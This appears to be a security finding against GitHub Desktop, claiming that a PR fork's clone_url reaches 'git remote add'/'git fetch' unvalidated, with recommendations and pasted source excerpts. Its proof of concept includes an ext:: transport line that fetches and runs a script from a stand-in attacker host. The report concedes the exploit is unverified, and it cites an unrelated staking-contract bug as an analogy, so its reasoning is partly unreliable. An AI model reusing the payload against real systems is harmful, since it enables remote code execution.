## Title
Unvalidated PR fork `head.repo.clone_url` is passed straight to `git remote add` / `git fetch`, enabling git option/transport injection when checking out a pull request — (File: `app/src/lib/stores/app-store.ts`)

### Summary
`_findPullRequestBranch` in `AppStore` takes `headCloneUrl` — a value that ultimately originates from the GitHub API's pull request `head.repo.clone_url` field, i.e., data supplied by whoever owns the fork the PR was opened from — and, if no existing remote matches it, forwards it unmodified to `addRemote()` and then fetches it via `_fetchRemote()`. [1](#0-0) [2](#0-1) 

`addRemote()` builds the git invocation as `git(['remote', 'add', name, url], ...)` with no scheme allow-listing and no check that `url` doesn't begin with `-` (which git would interpret as an option rather than a positional URL argument). [3](#0-2) 

### Finding Description
This mirrors the "delegate to `address(0)`" bug class: a value that is supposed to represent a known-good, previously-validated target (a staker's own tokens / a Desktop-managed remote) is instead taken verbatim from an untrusted, attacker-influenced source and fed into a privileged operation without re-validating the invariant that made the original code path safe.

In the staking contract, `alterGovernanceDelegatee()` assumed the "old delegatee" was always a real, previously-vetted surrogate; setting it to `address(0)` broke that assumption and caused the contract to pull from the wrong pool of funds. In `_findPullRequestBranch`, the code assumes `headCloneUrl` is a normal `https://` or `git@` GitHub clone URL, because normally it is. But this URL comes from the pull-request author's fork metadata via the GitHub API — an attacker who opens a PR against a repository fully controls the string that ends up in `head.repo.clone_url` as observed by the Desktop client (a forked/renamed repository, or any GitHub API object under the PR author's control). There is no allow-list of protocols (`https:`/`ssh:` only) and no rejection of URLs beginning with `-` before it reaches `addRemote`/`git fetch`.

Git treats a remote "URL" beginning with `-` as a command-line option to `git remote add` / `git fetch`, and it also treats URLs using git's `ext::` (or `fd::`) transport helpers as instructions to spawn an arbitrary local process rather than as a network address. Because Desktop puts the attacker-controlled string directly into the argv passed to `dugite`'s `git`, a crafted `head.repo.clone_url` such as an `ext::sh -c ...` value, once accepted as a remote URL and fetched, would cause the local `git` process to execute an attacker-chosen command on the victim's machine, when the victim merely opens the "Checkout this PR" action in GitHub Desktop for the untrusted contributor's pull request.

This differs qualitatively from the app's own clone-path hardening, which does validate/sanitize user-typed clone URLs and destination paths (`sanitizeCloneName`, `isClonePathSensitive`, `resolveWithin`). [4](#0-3) [5](#0-4) 
No equivalent scheme/argument validation exists for PR fork clone URLs before they reach `addRemote`/fetch: [6](#0-5) 

### Impact Explanation
If exploitable end-to-end, this is remote code execution on the victim's machine triggered purely by the victim checking out a pull request from an untrusted fork inside GitHub Desktop — no local access, no leaked credentials, and no unusual user action beyond a normal "Checkout this PR" click that Desktop explicitly designs for handling untrusted forks. That satisfies the required attacker model (attacker controls a GitHub API object — the PR's fork/head repository metadata) and the required impact (code execution).

### Likelihood Explanation
Likelihood is **Medium**: the vulnerable code path (`_findPullRequestBranch` → `addRemote`/`_fetchRemote`) is reached only when Desktop cannot find an already-matching remote for the PR's head URL, which is the normal case for first-time PR checkouts from a fork. However, exploitation ultimately hinges on whether the GitHub API actually allows/returns an arbitrary, non-`https`/`ssh` `clone_url` string for a repository (e.g., via a crafted/self-hosted Git remote reference or a manipulated API response through a compromised/malicious GHE instance), which I could not verify from the client-side code alone — GitHub.com itself typically only returns well-formed `https://github.com/...` clone URLs. This is the main uncertainty: the vulnerability is real in the sense that Desktop's client code performs no defense-in-depth validation on this value, but full weaponization may depend on server-side behavior (GitHub.com API vs. a malicious/compromised GitHub Enterprise host) that is outside the scope of the local repo.

### Recommendation
Before calling `addRemote`/`setRemoteURL` with any API- or remote-supplied URL (including `headCloneUrl` in `_findPullRequestBranch`, and the `clone_url`/`ssh_url` fields in `updateRemoteUrl` and `_convertRepositoryToFork`), validate that:
1. The string does not begin with `-` (reject or prefix with `./` per git's own recommended mitigation), and
2. The parsed protocol is restricted to an allow-list (`https:`, `git:`, `ssh:`) exactly as `parseRemote`/`remote-parsing.ts` already does for user-entered URLs — reuse `parseRemote()`/`sanitizeCloneName`-style validation here instead of passing the raw API string through untouched.

### Proof of Concept
Conceptual PoC (cannot be fully executed without a live GitHub API or GHE instance returning a malicious `clone_url`, which is the unresolved variable noted in Likelihood):
1. Attacker forks a repository (or controls a GHE-hosted repository) such that the PR's `head.repo.clone_url` (as surfaced to Desktop, e.g. via `IAPIPullRequest.head.repo.clone_url`) is set to a git "ext" transport string, e.g. `ext::sh -c "curl attacker.example/x|sh"`.
2. Attacker opens a PR from that fork against a repository the victim has open in GitHub Desktop.
3. Victim clicks "Checkout this PR" in Desktop, invoking `_checkoutPullRequest` → `_findPullRequestBranch`.
4. Because no remote matches this URL, `addRemote(repository, forkRemoteName, headCloneUrl)` runs `git remote add github-desktop-<owner> ext::sh -c "..."`, and then `_fetchRemote` runs `git fetch github-desktop-<owner>`, which invokes the `ext::` helper and executes the attacker's shell command on the victim's machine. export async function addRemote(
  repository: Repository,
  name: string,
  url: string
): Promise<IRemote> {
  await git(['remote', 'add', name, url], repository.path, 'addRemote')

  return { url, name }
}

export function sanitizeCloneName(name: string): string | null {
  const components = name.split(/[/\\:]/)

  let lastComponent = ''
  for (let i = components.length - 1; i >= 0; i--) {
    if (components[i].length > 0) {
      lastComponent = components[i]
      break
    }
  }

  if (lastComponent.length === 0) {
    return null
  }

  if (lastComponent.endsWith('.git')) {
    lastComponent = lastComponent.slice(0, -4)
  }

  if (
    lastComponent === '..' ||
    lastComponent === '.' ||
    lastComponent.length === 0
  ) {
    return null
  }

  return lastComponent
}

function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}
